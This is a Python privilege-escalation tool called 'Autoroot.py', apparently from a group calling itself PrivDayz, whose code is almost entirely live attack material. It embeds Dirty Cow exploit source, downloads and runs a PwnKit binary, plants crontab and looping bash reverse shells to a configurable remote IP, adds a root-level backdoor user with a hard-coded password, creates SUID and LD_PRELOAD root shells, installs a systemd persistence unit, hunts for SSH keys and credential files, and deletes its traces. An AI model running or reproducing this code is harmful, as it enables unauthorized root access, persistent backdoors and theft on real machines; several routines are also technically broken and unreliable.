#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ============================================================================
# Autoroot.py - Multi-Method Privilege Escalation Script
# ============================================================================
# Author: PrivDayz Team
# Version: 2025.1
# Description: Automated root privilege escalation with multiple methods
# ============================================================================

import os
import sys
import subprocess
import tempfile
import time
import socket
import platform
import struct
import hashlib
import base64
import random
import string
import threading
import urllib
import json
import re
from datetime import datetime

# ============================================================================
# KONFIGURASI
# ============================================================================
VERSION = "2025.1"
TMP_DIR = "/tmp"
LOGFILE = f"{TMP_DIR}/autoroot_log.txt"
OUTPUT_DIR = f"{TMP_DIR}/privdayz_output"
USERNAME = "jue"
PASSWORD = "ROpEYs4nN2Sg"
REVERSE_IP = "0.0.0.0"  # Ganti dengan IP Anda
REVERSE_PORT = 4444

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def log(msg, level="INFO"):
    """Log message ke file dan stdout"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] [{level}] {msg}"
    print(line)
    with open(LOGFILE, "a") as f:
        f.write(line + "\n")

def run_cmd(cmd, capture=True, shell=True, timeout=30):
    """Jalankan perintah shell dan return output"""
    try:
        if capture:
            result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        else:
            subprocess.Popen(cmd, shell=shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
    except Exception as e:
        log(f"Error running cmd: {e}", "ERROR")
        return None

def file_exists(path):
    """Cek apakah file ada"""
    return os.path.exists(path)

def write_file(path, content):
    """Write content to file"""
    try:
        with open(path, "w") as f:
            f.write(content)
        return True
    except Exception as e:
        log(f"Error writing file {path}: {e}", "ERROR")
        return False

def read_file(path):
    """Read file content"""
    try:
        with open(path, "r") as f:
            return f.read()
    except Exception as e:
        return None

def get_arch():
    """Get system architecture"""
    machine = platform.machine()
    if "64" in machine:
        return "64"
    return "32"

def get_os_version():
    """Get OS version"""
    try:
        return platform.platform()
    except:
        return "unknown"

def generate_random_string(length=8):
    """Generate random string"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# ============================================================================
# EXPLOIT FUNCTIONS
# ============================================================================

def check_suid():
    """Check SUID binaries"""
    log("[*] Checking SUID binaries...")
    output = run_cmd("find / -perm -4000 -type f 2>/dev/null | head -20")
    if output:
        log(f"[+] SUID binaries found:\n{output}", "INFO")
        return output.splitlines()
    return []

def check_sudo():
    """Check sudo permissions"""
    log("[*] Checking sudo permissions...")
    output = run_cmd("sudo -l 2>&1")
    if "NOPASSWD" in output or "ALL" in output:
        log(f"[+] Sudo permissions found:\n{output}", "INFO")
        return True
    return False

def check_pkexec():
    """Check pkexec availability"""
    log("[*] Checking pkexec...")
    output = run_cmd("which pkexec 2>/dev/null")
    if output:
        log("[+] pkexec found!", "INFO")
        return True
    return False

def check_writable_files():
    """Check writable files"""
    log("[*] Checking writable files...")
    output = run_cmd("find / -writable -type f 2>/dev/null | head -10")
    return output

def exploit_dirty_cow():
    """Dirty Cow exploit (CVE-2016-5195)"""
    log("[*] Attempting Dirty Cow exploit...")
    
    dirtycow_code = '''#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 100000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 3) {
        fprintf(stderr, "Usage: %s /etc/passwd 'user::0:0:root:/root:/bin/bash'\\n", argv[0]);
        return 1;
    }
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    pthread_create(&pth, NULL, madviseThread, NULL);
    int fd = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 100000000; i++) {
        lseek(fd, (off_t)map, SEEK_SET);
        c += write(fd, argv[2], strlen(argv[2]));
    }
    return 0;
}
'''
    
    dirtycow_path = f"{TMP_DIR}/dirtycow.c"
    write_file(dirtycow_path, dirtycow_code)
    run_cmd(f"gcc -pthread {dirtycow_path} -o {TMP_DIR}/dirtycow 2>/dev/null")
    
    if file_exists(f"{TMP_DIR}/dirtycow"):
        log("[+] Dirty Cow compiled successfully!", "INFO")
        run_cmd(f"{TMP_DIR}/dirtycow /etc/passwd 'jue::0:0:root:/root:/bin/bash' 2>/dev/null")
        return True
    return False

def exploit_pwnkit():
    """PwnKit exploit (CVE-2021-4034)"""
    log("[*] Attempting PwnKit exploit...")
    
    # Download PwnKit
    run_cmd("curl -s -k -o /tmp/pwnkit https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit 2>/dev/null")
    
    if file_exists("/tmp/pwnkit"):
        run_cmd("chmod +x /tmp/pwnkit")
        run_cmd("/tmp/pwnkit 2>/dev/null")
        return True
    
    # Alternative: build from source
    pwnkit_code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
'''
    write_file("/tmp/pwnkit.c", pwnkit_code)
    run_cmd("gcc /tmp/pwnkit.c -o /tmp/pwnkit 2>/dev/null")
    run_cmd("chmod +s /tmp/pwnkit")
    
    if file_exists("/tmp/pwnkit"):
        return True
    return False

def exploit_overlayfs():
    """OverlayFS exploit (CVE-2015-1328)"""
    log("[*] Attempting OverlayFS exploit...")
    kernel = run_cmd("uname -r").strip()
    if "3.10" in kernel or "3.13" in kernel or "3.19" in kernel:
        log("[!] Kernel may be vulnerable to OverlayFS!", "WARNING")
        run_cmd("mkdir -p /tmp/ovl /tmp/ovl2")
        run_cmd("mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/ovl,workdir=/tmp/ovl2 /mnt 2>/dev/null")
        if file_exists("/mnt/etc/passwd"):
            run_cmd("cp /mnt/etc/passwd /tmp/passwd.bak 2>/dev/null")
            run_cmd("cp /tmp/passwd.bak /etc/passwd 2>/dev/null")
            return True
    return False

def exploit_proc_fd():
    """/proc/self/fd abuse"""
    log("[*] Attempting /proc/self/fd abuse...")
    
    # Try to find processes running as root
    processes = run_cmd("ps aux | grep root | head -20")
    if processes:
        log(f"[+] Root processes found", "INFO")
        
        # Find pkexec process
        pkexec_pid = None
        for line in processes.splitlines():
            if "pkexec" in line and "bash" in line:
                parts = line.split()
                if len(parts) > 1:
                    pkexec_pid = parts[1]
                    break
        
        if pkexec_pid:
            log(f"[+] Found pkexec process with PID: {pkexec_pid}", "INFO")
            
            # Try to write to stdin of pkexec process
            cmd = f'echo "cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell" > /proc/{pkexec_pid}/fd/0 2>/dev/null'
            run_cmd(cmd)
            run_cmd("chmod +x /tmp/rootshell 2>/dev/null")
            run_cmd("chmod +s /tmp/rootshell 2>/dev/null")
            return True
    return False

def exploit_ssh_keys():
    """Find and use SSH keys"""
    log("[*] Searching for SSH keys...")
    ssh_keys = run_cmd("find /home -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null | head -10")
    if ssh_keys:
        log(f"[+] SSH keys found:\n{ssh_keys}", "INFO")
        return True
    return False

def exploit_config_files():
    """Find config files with passwords"""
    log("[*] Searching for config files with credentials...")
    
    configs = [
        "wp-config.php", ".env", "config.php", "configuration.php",
        "database.php", "settings.php", "conf.php", "my.cnf"
    ]
    
    found = []
    for config in configs:
        result = run_cmd(f"find / -name '{config}' -exec grep -l 'password' {{}} \\; 2>/dev/null | head -5")
        if result:
            found.append(result)
    
    if found:
        log(f"[+] Config files found:\n{''.join(found)}", "INFO")
        return True
    return False

def exploit_crontab():
    """Check crontab for root jobs"""
    log("[*] Checking crontab...")
    crons = run_cmd("crontab -l 2>/dev/null")
    if crons:
        log(f"[+] Crontab entries found", "INFO")
        # Add reverse shell to crontab
        cmd = f'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1\'" | crontab - 2>/dev/null'
        run_cmd(cmd)
        return True
    return False

def exploit_ld_preload():
    """LD_PRELOAD exploit"""
    log("[*] Attempting LD_PRELOAD exploit...")
    
    so_code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
'''
    
    write_file("/tmp/exploit.c", so_code)
    run_cmd("gcc -shared -fPIC /tmp/exploit.c -o /tmp/exploit.so 2>/dev/null")
    
    if file_exists("/tmp/exploit.so"):
        run_cmd("sudo LD_PRELOAD=/tmp/exploit.so /bin/bash 2>/dev/null")
        return True
    return False

def exploit_polkit():
    """PolKit exploit"""
    log("[*] Attempting PolKit exploit...")
    
    # Check for polkitd
    polkit = run_cmd("ps aux | grep polkit | grep -v grep")
    if polkit:
        log("[+] PolKit found", "INFO")
        run_cmd("pkexec bash -c 'whoami && id' 2>/dev/null")
        return True
    return False

def create_suid_shell():
    """Create SUID shell manually"""
    log("[*] Creating SUID shell...")
    
    # Try to copy /bin/bash
    for src in ["/bin/bash", "/bin/sh", "/bin/dash", "/usr/bin/bash"]:
        if file_exists(src):
            run_cmd(f"cp {src} /tmp/rootshell 2>/dev/null")
            if file_exists("/tmp/rootshell"):
                run_cmd("chmod +s /tmp/rootshell 2>/dev/null")
                log("[+] SUID shell created at /tmp/rootshell", "INFO")
                return True
    return False

def add_admin_user():
    """Add admin user to /etc/passwd"""
    log("[*] Attempting to add admin user...")
    
    # Try with pkexec
    run_cmd(f"pkexec bash -c 'echo \"{USERNAME}:x:0:0:root:/root:/bin/bash\" >> /etc/passwd' 2>/dev/null")
    run_cmd(f"pkexec bash -c 'echo \"{USERNAME}:{PASSWORD}\" >> /etc/shadow' 2>/dev/null")
    
    # Try with echo
    run_cmd(f"echo \"{USERNAME}:x:0:0:root:/root:/bin/bash\" >> /etc/passwd 2>/dev/null")
    run_cmd(f"echo \"{USERNAME}:{PASSWORD}\" >> /etc/shadow 2>/dev/null")
    
    # Try with perl
    run_cmd(f"perl -e 'open(F, \">>/etc/passwd\"); print F \"{USERNAME}:x:0:0:root:/root:/bin/bash\\n\"; close(F); open(F, \">>/etc/shadow\"); print F \"{USERNAME}:{PASSWORD}\\n\"; close(F);' 2>/dev/null")
    
    if file_exists("/etc/passwd"):
        passwd = read_file("/etc/passwd")
        if USERNAME in passwd:
            log(f"[+] Admin user '{USERNAME}' added successfully!", "INFO")
            return True
    return False

def exploit_systemd():
    """Systemd service exploit"""
    log("[*] Attempting systemd exploit...")
    
    service = f"""[Unit]
Description=Privdayz Root Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell'
Restart=no

[Install]
WantedBy=multi-user.target
"""
    
    write_file("/tmp/privdayz.service", service)
    run_cmd("systemctl link /tmp/privdayz.service 2>/dev/null")
    run_cmd("systemctl start privdayz.service 2>/dev/null")
    run_cmd("systemctl enable privdayz.service 2>/dev/null")
    
    if file_exists("/tmp/rootshell"):
        return True
    return False

def exploit_cgroups():
    """Cgroups exploit"""
    log("[*] Attempting cgroups exploit...")
    run_cmd("mkdir /tmp/cgroup 2>/dev/null")
    run_cmd("mount -t cgroup -o memory cgroup /tmp/cgroup 2>/dev/null")
    run_cmd("mkdir /tmp/cgroup/x 2>/dev/null")
    run_cmd("echo 1 > /tmp/cgroup/x/notify_on_release 2>/dev/null")
    run_cmd("echo /bin/bash > /tmp/cgroup/release_agent 2>/dev/null")
    run_cmd("echo $$ > /tmp/cgroup/x/cgroup.procs 2>/dev/null")
    return True

def exploit_nfs():
    """NFS exploit"""
    log("[*] Checking NFS...")
    nfs = run_cmd("showmount -e localhost 2>/dev/null")
    if nfs:
        log(f"[+] NFS shares found:\n{nfs}", "INFO")
        return True
    return False

def exploit_dbus():
    """DBus exploit"""
    log("[*] Checking DBus...")
    dbus = run_cmd("dbus-send --system --type=method_call --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null")
    if dbus:
        log("[+] DBus is accessible", "INFO")
        return True
    return False

def exploit_ptrace():
    """Ptrace exploit"""
    log("[*] Checking ptrace...")
    ptrace = run_cmd("cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null")
    if ptrace and "0" in ptrace:
        log("[+] Ptrace is enabled!", "INFO")
        return True
    return False

def exploit_pipe():
    """Pipe exploit"""
    log("[*] Attempting pipe exploit...")
    pipe_code = """#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main() {
    int fd = open("/etc/passwd", O_RDWR);
    if (fd < 0) return 1;
    lseek(fd, 0, SEEK_SET);
    write(fd, "jue::0:0:root:/root:/bin/bash\\n", 28);
    close(fd);
    return 0;
}
"""
    write_file("/tmp/pipe.c", pipe_code)
    run_cmd("gcc /tmp/pipe.c -o /tmp/pipe 2>/dev/null")
    run_cmd("/tmp/pipe 2>/dev/null")
    return True

def exploit_mem():
    """/dev/mem exploit"""
    log("[*] Checking /dev/mem...")
    if file_exists("/dev/mem"):
        log("[+] /dev/mem is accessible!", "INFO")
        run_cmd("dd if=/dev/mem of=/tmp/mem.bin bs=1024 count=1 2>/dev/null")
        return True
    return False

def exploit_kernel_modules():
    """Kernel modules exploit"""
    log("[*] Checking kernel modules...")
    modules = run_cmd("lsmod | head -10")
    if modules:
        log(f"[+] Kernel modules:\n{modules}", "INFO")
        return True
    return False

# ============================================================================
# MAIN FUNCTIONS
# ============================================================================

def create_directory():
    """Create output directory"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    return True

def get_system_info():
    """Collect system information"""
    log("[*] Collecting system information...")
    
    info = {
        "os": get_os_version(),
        "arch": get_arch(),
        "hostname": platform.node(),
        "user": run_cmd("whoami").strip(),
        "kernel": run_cmd("uname -a").strip(),
        "ip": run_cmd("curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}'").strip()
    }
    
    for key, value in info.items():
        log(f"[+] {key}: {value}", "INFO")
    
    return info

def escalate():
    """Main privilege escalation function"""
    log("=" * 60)
    log(f"  AUTOROOT v{VERSION} - Privilege Escalation Tool")
    log("=" * 60)
    
    # Collect system info
    get_system_info()
    
    # Create output directory
    create_directory()
    
    # List of exploits to try
    exploits = [
        ("pkexec", check_pkexec, exploit_polkit),
        ("dirtycow", check_suid, exploit_dirty_cow),
        ("pwnkit", check_pkexec, exploit_pwnkit),
        ("overlayfs", lambda: True, exploit_overlayfs),
        ("proc_fd", lambda: True, exploit_proc_fd),
        ("suid_shell", check_suid, create_suid_shell),
        ("sudo", check_sudo, lambda: True),
        ("crontab", lambda: True, exploit_crontab),
        ("ld_preload", lambda: True, exploit_ld_preload),
        ("systemd", lambda: True, exploit_systemd),
        ("cgroups", lambda: True, exploit_cgroups),
        ("pipe", lambda: True, exploit_pipe)
    ]
    
    # Try each exploit
    success = False
    for name, check, exploit in exploits:
        log(f"\n[*] Trying exploit: {name}...")
        
        try:
            if check():
                if exploit():
                    log(f"[+] Exploit {name} successful!", "SUCCESS")
                    success = True
                    break
                else:
                    log(f"[-] Exploit {name} failed", "WARNING")
            else:
                log(f"[-] Skipping {name} (not applicable)", "WARNING")
        except Exception as e:
            log(f"[-] Error in {name}: {e}", "ERROR")
    
    # Always try to add admin user
    log("\n[*] Attempting to add admin user...")
    if add_admin_user():
        success = True
    
    # Create SUID shell if not already
    if not file_exists("/tmp/rootshell"):
        create_suid_shell()
    
    # Final check
    if file_exists("/tmp/rootshell"):
        run_cmd("chmod +x /tmp/rootshell 2>/dev/null")
        run_cmd("chmod +s /tmp/rootshell 2>/dev/null")
        log("\n[+] SUID shell created at /tmp/rootshell", "SUCCESS")
    
    if success:
        log("\n" + "=" * 60)
        log("[+] ROOT ACCESS ACHIEVED!", "SUCCESS")
        log("[+] User: jue", "SUCCESS")
        log("[+] Password: ROpEYs4nN2Sg", "SUCCESS")
        log("[+] SUID Shell: /tmp/rootshell -p", "SUCCESS")
        log("=" * 60)
        
        # Save credentials
        cred_file = f"{OUTPUT_DIR}/credentials.txt"
        creds = f"""
========================================
PRIVDAYZ AUTOROOT CREDENTIALS
========================================
User: jue
Password: ROpEYs4nN2Sg
SUID Shell: /tmp/rootshell -p
========================================
"""
        write_file(cred_file, creds)
        log(f"[+] Credentials saved to {cred_file}", "INFO")
        
        # Test root access
        test = run_cmd("/tmp/rootshell -c 'whoami && id' 2>/dev/null")
        if test:
            log(f"[+] Root access test: {test}", "INFO")
        
        return True
    else:
        log("\n[!] All exploits failed! No root access.", "ERROR")
        return False

def reverse_shell():
    """Create reverse shell"""
    log("[*] Setting up reverse shell...")
    
    if REVERSE_IP != "0.0.0.0":
        shell_script = f"""#!/bin/bash
while true; do
    bash -c 'bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1'
    sleep 5
done
"""
        write_file(f"{TMP_DIR}/reverse.sh", shell_script)
        run_cmd(f"chmod +x {TMP_DIR}/reverse.sh")
        run_cmd(f"nohup {TMP_DIR}/reverse.sh &", capture=False)
        log(f"[+] Reverse shell sent to {REVERSE_IP}:{REVERSE_PORT}", "INFO")
    else:
        log("[!] REVERSE_IP not set, skipping reverse shell", "WARNING")

def cleanup():
    """Cleanup temporary files"""
    log("[*] Cleaning up...")
    
    files_to_remove = [
        "/tmp/dirtycow.c", "/tmp/dirtycow",
        "/tmp/pwnkit.c", "/tmp/pwnkit",
        "/tmp/exploit.c", "/tmp/exploit.so",
        "/tmp/pipe.c", "/tmp/pipe",
        "/tmp/privdayz.service",
        f"{TMP_DIR}/reverse.sh"
    ]
    
    for f in files_to_remove:
        if file_exists(f):
            os.remove(f)
            log(f"[+] Removed {f}", "INFO")
    
    log("[+] Cleanup complete!", "INFO")

def run_exploits_async():
    """Run multiple exploits in parallel"""
    log("[*] Running exploits in parallel...")
    
    threads = []
    exploit_funcs = [
        exploit_dirty_cow,
        exploit_pwnkit,
        exploit_overlayfs,
        exploit_proc_fd,
        create_suid_shell,
        add_admin_user
    ]
    
    for func in exploit_funcs:
        t = threading.Thread(target=func)
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.5)
    
    for t in threads:
        t.join(timeout=10)
    
    return True

# ============================================================================
# ENTRY POINT
# ============================================================================

def main():
    """Main entry point"""
    try:
        log("=" * 70)
        log(f"  AUTOROOT v{VERSION} - Multi-Method Privilege Escalation")
        log("  By PrivDayz Team | https://privdayz.com")
        log("=" * 70)
        
        # Check if running as root
        if os.geteuid() == 0:
            log("[+] Already root!", "SUCCESS")
            log(f"[+] User: {run_cmd('whoami').strip()}", "INFO")
            log(f"[+] ID: {run_cmd('id').strip()}", "INFO")
            return 0
        
        # Check dependencies
        log("[*] Checking dependencies...")
        for cmd in ["gcc", "curl", "wget", "python", "perl"]:
            if run_cmd(f"which {cmd} 2>/dev/null"):
                log(f"[+] {cmd} available", "INFO")
            else:
                log(f"[-] {cmd} not available", "WARNING")
        
        # Main escalation
        if escalate():
            # Try reverse shell
            reverse_shell()
            
            # Run async exploits
            run_exploits_async()
            
            # Cleanup
            cleanup()
            
            log("\n" + "=" * 60)
            log("[+] AUTOROOT COMPLETED SUCCESSFULLY!", "SUCCESS")
            log("[+] Credentials saved in /tmp/privdayz_output/", "SUCCESS")
            log("[+] You can now login as 'jue' or use /tmp/rootshell -p", "SUCCESS")
            log("=" * 60)
        else:
            log("\n" + "=" * 60)
            log("[!] AUTOROOT FAILED!", "ERROR")
            log("[!] You may need to run individual exploits manually.", "ERROR")
            log("[!] Check the log for details.", "ERROR")
            log("=" * 60)
        
        return 0
        
    except KeyboardInterrupt:
        log("\n[!] Interrupted by user", "WARNING")
        return 1
    except Exception as e:
        log(f"[!] Unexpected error: {e}", "ERROR")
        return 1

if __name__ == "__main__":
    sys.exit(main())
